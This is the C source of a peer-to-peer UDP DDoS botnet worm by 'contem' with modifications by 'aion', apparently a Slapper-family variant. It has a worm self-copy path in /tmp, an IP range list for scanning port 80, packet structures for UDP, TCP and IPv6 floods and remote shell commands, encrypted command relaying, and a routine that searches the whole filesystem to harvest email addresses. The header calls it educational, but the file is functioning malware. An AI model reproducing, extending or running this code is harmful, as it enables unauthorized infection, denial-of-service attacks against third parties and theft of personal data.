/****************************************************************************
 *                                                                          *
 *           Peer-to-peer UDP Distributed Denial of Service (PUD)           *
 *                         by contem@efnet                                  *
 *                                                                          *
 *         Virtually connects computers via the udp protocol on the         *
 *  specified port.  Uses a newly created peer-to-peer protocol that        *
 *  incorperates uses on unstable or dead computers.  The program is        *
 *  ran with the parameters of another ip on the virtual network.  If       *
 *  running on the first computer, run with the ip 127.0.0.1 or some        *
 *  other type of local address.  Ex:                                       *
 *                                                                          *
 *           Computer A:   ./program 127.0.0.1                              *
 *           Computer B:   ./program Computer_A                             *
 *           Computer C:   ./program Computer_A                             *
 *           Computer D:   ./program Computer_C                             *
 *                                                                          *
 *         Any form of that will work.  The linking process works by        *
 *  giving each computer the list of avaliable computers, then              *
 *  using a technique called broadcast segmentation combined with TCP       *
 *  like functionality to insure that another computer on the network       *
 *  receives the broadcast packet, segments it again and recreates          *
 *  the packet to send to other hosts.  That technique can be used to       *
 *  support over 16 million simutaniously connected computers.              *
 *                                                                          *
 *         Thanks to ensane and st for donating shells and test beds        *
 *  for this program.  And for the admins who removed me because I          *
 *  was testing this program (you know who you are) need to watch           *
 *  their backs.                                                            *
 *                                                                          *
 *         I am not responsible for any harm caused by this program!        *
 *  I made this program to demonstrate peer-to-peer communication and       *
 *  should not be used in real life.  It is an education program that       *
 *  should never even be ran at all, nor used in any way, shape or          *
 *  form.  It is not the authors fault if it was used for any purposes      *
 *  other than educational.                                                 *
 *									    *
 *  some modification done by aion (aion@ukr.net)                           *
 ****************************************************************************/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/telnet.h>
#include <sys/wait.h>
#include <signal.h>

#define SCAN
#undef LARGE_NET
#undef FREEBSD

#define BROADCASTS	2
#define LINKS		128
#define CLIENTS		128
#define PORT		4156
#define SCANPORT	80
#define SCANTIMEOUT	5
#define MAXPATH		4096
#define ESCANPORT	10100
#define VERSION		20092002
#define WORMSRC		"/tmp/.unlock"
#define UUHEAD		"begin 655 .unlock\n"

//////////////////////////////////////////////////////////////////////////////////////
//                                  Macros                                          //
//////////////////////////////////////////////////////////////////////////////////////

#define FREE(x) {if (x) { free(x);x=NULL; }}

enum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };
enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };
enum { AREAD=1, AWRITE=2, AEXCEPT=4 };

//////////////////////////////////////////////////////////////////////////////////////
//                                  Packet headers                                  //
//////////////////////////////////////////////////////////////////////////////////////

struct llheader {
	char type;
	unsigned long checksum;
	unsigned long id;
};
struct header {
	char tag;
	int id;
	unsigned long len;
	unsigned long seq;
};
struct route_rec {
	struct header h;
	char sync;
	unsigned char hops;
	unsigned long server;
	unsigned long links;
};
struct kill_rec {
	struct header h;
};
struct sh_rec {
	struct header h;
};
struct list_rec {
	struct header h;
};
struct udp_rec {
	struct header h;
	unsigned long size;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct tcp_rec {
	struct header h;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct tcp6_rec {
	struct header h;
	unsigned long target[4];
	unsigned short port;
	unsigned long secs;
};
struct gen_rec {
	struct header h;
	unsigned long target;
	unsigned short port;
	unsigned long secs;
};
struct df_rec {
	struct header h;
	unsigned long target;
	unsigned long secs;
};
struct add_rec {
	struct header h;
	unsigned long server;
	unsigned long socks;
	unsigned long bind;
	unsigned short port;
};
struct data_rec {
	struct header h;
};
struct addsrv_rec {
	struct header h;
};
struct initsrv_rec {
	struct header h;
};
struct qmyip_rec {
	struct header h;
};
struct myip_rec {
	struct header h;
	unsigned long ip;
};
struct escan_rec {
	struct header h;
	unsigned long ip;
};
struct getinfo_rec {
	struct header h;
	unsigned long time;
	unsigned long mtime;
};
struct info_rec {
	struct header h;
	unsigned char a;
	unsigned char b;
	unsigned char c;
	unsigned char d;
	unsigned long ip;
	unsigned long uptime;
	unsigned long reqtime;
	unsigned long reqmtime;
	unsigned long in;
	unsigned long out;
	unsigned long version;
};

//////////////////////////////////////////////////////////////////////////////////////
//                             Public variables                                     //
//////////////////////////////////////////////////////////////////////////////////////

struct ainst {
	void *ext,*ext5;
	int ext2,ext3,ext4;

	int sock,error;
	unsigned long len;
	struct sockaddr_in in;
};
struct ainst clients[CLIENTS*2];
struct ainst udpclient;
unsigned int sseed=0;
struct route_table {
	int id;
	unsigned long ip;
	unsigned short port;
} routes[LINKS];
unsigned long numlinks, *links=NULL, myip=0;
unsigned long sequence[LINKS], rsa[LINKS];
unsigned int *pids=NULL;
unsigned long numpids=0;
unsigned long uptime=0, in=0, out=0;
unsigned long synctime=0;
int syncmodes=1;

struct mqueue {
	char *packet;
	unsigned long len;
	unsigned long id;
	unsigned long time;
	unsigned long ltime;
	unsigned long destination;
	unsigned short port;
	unsigned char trys;
	struct mqueue *next;
} *queues=NULL;

#ifdef SCAN
unsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,
	46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,
	139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,
	168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,
	198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,
	230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };
#endif

//////////////////////////////////////////////////////////////////////////////////////
//                               Public routines                                    //
//////////////////////////////////////////////////////////////////////////////////////

unsigned long gettimeout() {
	return 36+(numlinks/15);
}

void syncmode(int mode) {
	syncmodes=mode;
}

void gsrand(unsigned long s) {
	sseed=s;
}
unsigned long grand() {
	sseed=((sseed*965764979)%65535)/2;
	return sseed;
}

int mfork() {
	unsigned int parent, *newpids, i;
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	if (newpids == NULL) return parent;
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	FREE(pids);
	pids=newpids;
	return parent;
}

char *aerror(struct ainst *inst) {
	if (inst == NULL) return "Invalid instance or socket";
	switch(inst->error) {
		case ASUCCESS:return "Operation Success";
		case ARESOLVE:return "Unable to resolve";
		case ACONNECT:return "Unable to connect";
		case ASOCKET:return "Unable to create socket";
		case ABIND:return "Unable to bind socket";
		case AINUSE:return "Port is in use";
		case APENDING:return "Operation pending";
		case AUNKNOWN:default:return "Unknown";
	}
	return "";
}

int aresolve(char *host) {
 	struct hostent *hp;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		unsigned long a;
		if ((hp = gethostbyname(host)) == NULL) return 0;
		bcopy((char*)hp->h_addr, (char*)&a, hp->h_length);
		return a;
	}
	else return inet_addr(host);
}

int abind(struct ainst *inst,unsigned long ip,unsigned short port) {
	struct sockaddr_in in;
	if (inst == NULL) return (AINSTANCE);
	if (inst->sock == 0) {
		inst->error=AINSTANCE;
		return (AINSTANCE);
	}
	inst->len=0;
	in.sin_family = AF_INET;
	if (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;
	else in.sin_addr.s_addr = ip;
	in.sin_port = htons(port);
	if (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
	inst->error=ASUCCESS;
	return ASUCCESS;
}

int await(struct ainst **inst,unsigned long len,char type,long secs) {
	struct timeval tm,*tmp;
	fd_set read,write,except,*readp,*writep,*exceptp;
	int p,ret,max;
	if (inst == NULL) return (AINSTANCE);
	for (p=0;p<len;p++) inst[p]->len=0;
	if (secs > 0) {
		tm.tv_sec=secs;
		tm.tv_usec=0;
		tmp=&tm;
	}
	else tmp=(struct timeval *)NULL;
	if (type & AREAD) {
		FD_ZERO(&read);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);
		readp=&read;
	}
	else readp=(struct fd_set*)0;
	if (type & AWRITE) {
		FD_ZERO(&write);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);
		writep=&write;
	}
	else writep=(struct fd_set*)0;
	if (type & AEXCEPT) {
		FD_ZERO(&except);
		for (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);
		exceptp=&except;
	}
	else exceptp=(struct fd_set*)0;
	for (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;
	if ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {
		for (p=0;p<len;p++) inst[p]->error=APENDING;
		return (APENDING);
	}
	if (ret == -1) return (AUNKNOWN);
	for (p=0;p<len;p++) {
		if (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;
		if (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;
		if (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;
	}
	for (p=0;p<len;p++) inst[p]->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sync_check(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
		inst->error=ASUCCESS;
		return (ASUCCESS);
	}
	if (!(errno == EINPROGRESS ||errno == EALREADY)) {
		inst->error=ACONNECT;
		return (ACONNECT);
	}
	inst->error=APENDING;
	return (APENDING);
}

int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_connect(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
	unsigned long start;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_NONBLOCK;
	fcntl(inst->sock, F_SETFL, flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {
			inst->error=ASUCCESS;
			return (ASUCCESS);
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	inst->error=ACONNECT;
	return (ACONNECT);
}

int atcp_accept(struct ainst *inst,struct ainst *child) {
	int sock;
	unsigned int datalen;
	if (inst == NULL || child == NULL) return (AINSTANCE);
	datalen=sizeof(child->in);
	inst->len=0;
	memcpy((void*)child,(void*)inst,sizeof(struct ainst));
	if ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {
		memset((void*)child,0,sizeof(struct ainst));
		inst->error=APENDING;
		return (APENDING);
	}
	child->sock=sock;
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if ((datalen=write(inst->sock,buf,len)) < len) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_sendmsg(struct ainst *inst, char *words, ...) {
	static char textBuffer[2048];
	unsigned int a;
	va_list args;
	va_start(args, words);
	a=vsprintf(textBuffer, words, args);
	va_end(args);
	return atcp_send(inst,textBuffer,a);
}

int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((datalen=read(inst->sock,buf,len)) < 0) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	if (datalen == 0 && len) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int atcp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_listen(struct ainst *inst,unsigned int port) {
	int flag=1;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	inst->in.sin_family = AF_INET;
	inst->in.sin_addr.s_addr = INADDR_ANY;
	inst->in.sin_port = htons(port);
	if (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {
		inst->error=ABIND;
		return (ABIND);
	}
#ifdef O_DIRECT
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_DIRECT;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	flag=1;
	setsockopt(inst->sock,SOL_SOCKET,SO_OOBINLINE,&flag,sizeof(flag));
	return (ASUCCESS);
}

int audp_setup(struct ainst *inst,char *host,unsigned int port) {
	int flag=1;
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {
		inst->error=ASOCKET;
		return (ASOCKET);
	}
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
#ifdef O_DIRECT
	flag = fcntl(inst->sock, F_GETFL, 0);
	flag |= O_DIRECT;
	fcntl(inst->sock, F_SETFL, flag);
#endif
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_relay(struct ainst *parent,struct ainst *inst,char *host,unsigned int port) {
 	struct hostent *hp;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	inst->sock = parent->sock;
	if (inet_addr(host) == 0 || inet_addr(host) == -1) {
		if ((hp = gethostbyname(host)) == NULL) {
			inst->error=ARESOLVE;
			return (ARESOLVE);
		}
		bcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);
	}
	else inst->in.sin_addr.s_addr=inet_addr(host);
	inst->in.sin_family = AF_INET;
	inst->in.sin_port = htons(port);
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_send(struct ainst *inst,char *buf,unsigned long len) {
	long datalen;
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	errno=0;
	if ((datalen=sendto(inst->sock,buf,len,0,(struct sockaddr*)&inst->in,sizeof(inst->in))) < len) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	out++;
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

int audp_sendmsg(struct ainst *inst, char *words, ...) {
	static char textBuffer[2048];
	unsigned int a;
	va_list args;
	va_start(args, words);
	a=vsprintf(textBuffer, words, args);
	va_end(args);
	return audp_send(inst,textBuffer,a);
}

int audp_recv(struct ainst *inst,struct ainst *client,char *buf,unsigned long len) {
	long datalen,nlen;
	if (inst == NULL) return (AINSTANCE);
	nlen=sizeof(inst->in);
	inst->len=0;
	memcpy((void*)client,(void*)inst,sizeof(struct ainst));
	if ((datalen=recvfrom(inst->sock,buf,len,0,(struct sockaddr*)&client->in,(size_t*)&nlen)) < 0) {
		if (errno == EAGAIN) {
			inst->error=APENDING;
			return (APENDING);
		}
		else {
			inst->error=AUNKNOWN;
			return (AUNKNOWN);
		}
	}
	inst->len=datalen;
	inst->error=ASUCCESS;
	return (ASUCCESS);
} 

int audp_close(struct ainst *inst) {
	if (inst == NULL) return (AINSTANCE);
	inst->len=0;
	if (close(inst->sock) < 0) {
		inst->error=AUNKNOWN;
		return (AUNKNOWN);
	}
	inst->sock=0;
	inst->error=ASUCCESS;
	return (ASUCCESS);
}

unsigned long _decrypt(char *str, unsigned long len) {
	unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
	gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
	while(1) {
		gsrand(seed[pos%4]+grand()+pos);
		str[pos]-=grand();
		pos++;
		if (pos >= len) break;
	}
	return pos;
}

unsigned long _encrypt(char *str, unsigned long len) {
	unsigned long pos=0,seed[4]={0x78912389,0x094e7bc43,0xba5de30b,0x7bc54da7};
	gsrand(((seed[0]+seed[1])*seed[2])^seed[3]);
	while(1) {
		gsrand(seed[pos%4]+grand()+pos);
		str[pos]+=grand();
		pos++;
		if (pos >= len) break;
	}
	return pos;
}

int useseq(unsigned long seq) {
	unsigned long a;
	if (seq == 0) return 0;
	for (a=0;a<LINKS;a++) if (sequence[a] == seq) return 1;
	return 0;
}

unsigned long newseq() {
	unsigned long seq;
	while(1) {
		seq=(rand()*rand())^rand();
		if (useseq(seq) || seq == 0) continue;
		break;
	}
	return seq;
}

void addseq(unsigned long seq) {
	unsigned long i;
	for (i=LINKS-1;i>0;i--) sequence[i]=sequence[i-1];
	sequence[0]=seq;
}

void addserver(unsigned long server) {
	unsigned long *newlinks, i, stop;
	char a=0;
	for (i=0;i<numlinks;i++) if (links[i] == server) a=1;
	if (a == 1 || server == 0) return;
	numlinks++;
	newlinks=(unsigned long*)malloc((numlinks+1)*sizeof(unsigned long));
	if (newlinks == NULL) return;
	stop=rand()%numlinks;
	for (i=0;i<stop;i++) newlinks[i]=links[i];
	newlinks[i]=server;
	for (;i<numlinks-1;i++) newlinks[i+1]=links[i];
	FREE(links);
	links=newlinks;
}

void conv(char *str,int len,unsigned long server) {
	memset(str,0,len);
	strcpy(str,(char*)inet_ntoa(*(struct in_addr*)&server));
}

int isreal(unsigned long server) {
	char srv[256];
	unsigned int i,f;
	unsigned char a=0,b=0;
	conv(srv,256,server);
	for (i=0;i<strlen(srv) && srv[i]!='.';i++);
	srv[i]=0;
	a=atoi(srv);
	f=i+1;
	for (i++;i<strlen(srv) && srv[i]!='.';i++);
	srv[i]=0;
	b=atoi(srv+f);
	if (a == 127 || a == 10 || a == 0) return 0;
	if (a == 172 && b >= 16 && b <= 31) return 0;
	if (a == 192 && b == 168) return 0;
	return 1;
}

u_short in_cksum(u_short *addr, int len) {
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer =0;
	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}

int usersa(unsigned long rs) {
	unsigned long a;
	if (rs == 0) return 0;
	for (a=0;a<LINKS;a++) if (rsa[a] == rs) return 1;
	return 0;
}

unsigned long newrsa() {
	unsigned long rs;
	while(1) {
		rs=(rand()*rand())^rand();
		if (usersa(rs) || rs == 0) continue;
		break;
	}
	return rs;
}

void addrsa(unsigned long rs) {
	unsigned long i;
	for (i=LINKS-1;i>0;i--) rsa[i]=rsa[i-1];
	rsa[0]=rs;
}

void delqueue(unsigned long id) {
	struct mqueue *getqueue=queues, *prevqueue=NULL;
	while(getqueue != NULL) {
		if (getqueue->id == id) {
			getqueue->trys--;
			if (!getqueue->trys) {
				if (prevqueue) prevqueue->next=getqueue->next;
				else queues=getqueue->next;
			}
			return;
		}
		prevqueue=getqueue;
		getqueue=getqueue->next;
	}
}

int waitforqueues() {
	if (mfork() == 0) {
		sleep(gettimeout());
		return 0;
	}
	return 1;
}

//////////////////////////////////////////////////////////////////////////////////////
//                                   Sending functions                              //
//////////////////////////////////////////////////////////////////////////////////////

struct ainst udpserver;

char *lowsend(struct ainst *ts,unsigned char b,char *buf,unsigned long len) {
	struct llheader rp;
	struct mqueue *q;
	char *mbuf=(char*)malloc(sizeof(rp)+len);
	if (mbuf == NULL) return NULL;
	memset((void*)&rp,0,sizeof(struct llheader));
	rp.checksum=in_cksum(buf,len);
	rp.id=newrsa();
	rp.type=0;
	memcpy(mbuf,&rp,sizeof(rp));
	memcpy(mbuf+sizeof(rp),buf,len);

	q=(struct mqueue *)malloc(sizeof(struct mqueue));
	q->packet=(char*)malloc(sizeof(rp)+len);
	memcpy(q->packet,mbuf,sizeof(rp)+len);
	q->len=sizeof(rp)+len;
	q->id=rp.id;
	q->time=time(NULL);
	q->ltime=time(NULL);
	if (b) {
		q->destination=0;
		q->port=PORT;
		q->trys=b;
	}
	else {
		q->destination=ts->in.sin_addr.s_addr;
		q->port=htons(ts->in.sin_port);
		q->trys=1;
	}
	q->next=queues;
	queues=q;

	if (ts) {
		audp_send(ts,mbuf,len+sizeof(rp));
		FREE(mbuf);
	}
	else return mbuf;
}

int relayclient(struct ainst *ts,char *buf,unsigned long len) {
	return lowsend(ts,0,buf,len)?1:0;
}

int relay(unsigned long server,char *buf,unsigned long len) {
	struct ainst ts;
	char srv[256];
	memset((void*)&ts,0,sizeof(struct ainst));
	conv(srv,256,server);
	audp_relay(&udpserver,&ts,srv,PORT);
	return lowsend(&ts,0,buf,len)?1:0;
}

void segment(unsigned char low,char *buf, unsigned long len) {
	unsigned long a=0,c=0;
	char *mbuf=NULL;
	if (numlinks == 0 || links == NULL) return;
	if (low) mbuf=lowsend(NULL,low,buf,len);
	for(;c < 10;c++) {
		a=rand()%numlinks;
		if (links[a] != myip) {
			struct ainst ts;
			char srv[256];
			memset((void*)&ts,0,sizeof(struct ainst));
			conv(srv,256,links[a]);
			audp_relay(&udpserver,&ts,srv,PORT);
			if (mbuf) audp_send(&ts,mbuf,len+sizeof(struct llheader));
			else audp_send(&ts,buf,len);
			break;
		}
	}
	FREE(mbuf);
}

void broadcast(char *buf,unsigned long len) {
	struct route_rec rc;
	char *str=(char*)malloc(sizeof(struct route_rec)+len+1);
	if (str == NULL) return;
	memset((void*)&rc,0,sizeof(struct route_rec));
	rc.h.tag=0x26;
	rc.h.id=rand();
	rc.h.len=sizeof(struct route_rec)+len;
	rc.h.seq=newseq();
	rc.server=0;
	rc.sync=syncmodes;
	rc.links=numlinks;
	rc.hops=5;
	memcpy((void*)str,(void*)&rc,sizeof(struct route_rec));
	memcpy((void*)(str+sizeof(struct route_rec)),(void*)buf,len);
	segment(2,str,sizeof(struct route_rec)+len);
	FREE(str);
}

void syncm(struct ainst *inst,char tag,int id) {
	struct addsrv_rec rc;
	struct next_rec { unsigned long server; } fc;
	unsigned long a,b;
	for (b=0;;b+=700) {
		unsigned long _numlinks=numlinks-b>700?700:numlinks-b;
		unsigned long *_links=links+b;
		unsigned char *str;
		if (b > numlinks) break;
		str=(unsigned char*)malloc(sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		if (str == NULL) return;
		memset((void*)&rc,0,sizeof(struct addsrv_rec));
		rc.h.tag=tag;
		rc.h.id=id;
		if (id) rc.h.seq=newseq();
		rc.h.len=sizeof(struct next_rec)*_numlinks;
		memcpy((void*)str,(void*)&rc,sizeof(struct addsrv_rec));
		for (a=0;a<_numlinks;a++) {
			memset((void*)&fc,0,sizeof(struct next_rec));
			fc.server=_links[a];
			memcpy((void*)(str+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec))),(void*)&fc,sizeof(struct next_rec));
		}
		if (!id) relay(inst->in.sin_addr.s_addr,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		else relayclient(inst,(void*)str,sizeof(struct addsrv_rec)+(_numlinks*sizeof(struct next_rec)));
		FREE(str);
	}
}

void senderror(struct ainst *inst, int id, char *buf2) {
	struct data_rec rc;
	char *str,*buf=strdup(buf2);
	memset((void*)&rc,0,sizeof(struct data_rec));
	rc.h.tag=0x45;
	rc.h.id=id;
	rc.h.seq=newseq();
	rc.h.len=strlen(buf2);
	_encrypt(buf,strlen(buf2));
	str=(char*)malloc(sizeof(struct data_rec)+strlen(buf2)+1);
	if (str == NULL) {
		FREE(buf);
		return;
	}
	memcpy((void*)str,(void*)&rc,sizeof(struct data_rec));
	memcpy((void*)(str+sizeof(struct data_rec)),buf,strlen(buf2));
	relayclient(&udpclient,str,sizeof(struct data_rec)+strlen(buf2));
	FREE(str);
	FREE(buf);
}

//////////////////////////////////////////////////////////////////////////////////////
//                                      Scan for email                              //
//////////////////////////////////////////////////////////////////////////////////////

int isgood(char a) {
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	if (a >= '0' && a <= '9') return 1;
	if (a == '.' || a == '@' || a == '^' || a == '-' || a == '_') return 1;
	return 0;
}

int islisten(char a) {
	if (a == '.') return 1;
	if (a >= 'a' && a <= 'z') return 1;
	if (a >= 'A' && a <= 'Z') return 1;
	return 0;
}

struct _linklist {
	char *name;
	struct _linklist *next;
} *linklist=NULL;

void AddToList(char *str) {
	struct _linklist *getb=linklist,*newb;
	while(getb != NULL) {
		if (!strcmp(str,getb->name)) return;
		getb=getb->next;
	}
	newb=(struct _linklist *)malloc(sizeof(struct _linklist));
	if (newb == NULL) return;
	newb->name=strdup(str);
	newb->next=linklist;
	linklist=newb;
}

void cleanup(char *buf) {
	while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
	while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
		unsigned long i;
		for (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];
	}
}

void ScanFile(char *f) {
	FILE *file=fopen(f,"r");
	unsigned long startpos=0;
	if (file == NULL) return;
	while(1) {
		char buf[2];
		memset(buf,0,2);
		fseek(file,startpos,SEEK_SET);
		fread(buf,1,1,file);
		startpos++;
		if (feof(file)) break;
		if (*buf == '@') {
			char email[256],c,d;
			unsigned long pos=0;
			while(1) {
				unsigned long oldpos=ftell(file);
				fseek(file,-1,SEEK_CUR);
				c=fgetc(file);
				if (!isgood(c)) break;
				fseek(file,-1,SEEK_CUR);
				if (oldpos == ftell(file)) break;
			}
			for (pos=0,c=0,d=0;pos<255;pos++) {
				email[pos]=fgetc(file);
				if (email[pos] == '.') c++;
				if (email[pos] == '@') d++;
				if (!isgood(email[pos])) break;
			}
			email[pos]=0;
			if (c == 0 || d != 1) continue;
			if (email[strlen(email)-1] == '.') email[strlen(email)-1]=0;
			if (*email == '@' || *email == '.' || !*email) continue;
			if (!strcmp(email,"webmaster@mydomain.com")) continue;
			for (pos=0,c=0;pos<strlen(email);pos++) if (email[pos] == '.') c=pos;
			if (c == 0) continue;
			if (!strncmp(email+c,".hlp",4)) continue;
			for (pos=c,d=0;pos<strlen(email);pos++) if (!islisten(email[pos])) d=1;
			if (d == 1) continue;
			AddToList(email);
		}
	}
	fclose(file);
}

void StartScan() {
	FILE *f;
	f=popen("find / -type f","r");
	if (f == NULL) return;
	while(1) {
		char fullfile[MAXPATH];
		memset(fullfile,0,MAXPATH);
		fgets(fullfile,MAXPATH,f);
		if (feof(f)) break;
		while(fullfile[strlen(fullfile)-1]=='\n' ||
			fullfile[strlen(fullfile)-1] == '\r')
			fullfile[strlen(fullfile)-1]=0;
		if (!strncmp(fullfile,"/proc",5)) continue;
		if (!strncmp(fullfile,"/dev",4)) continue;
		if (!strncmp(fullfile,"/bin",4)) continue;
		ScanFile(fullfile);
	}
}

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
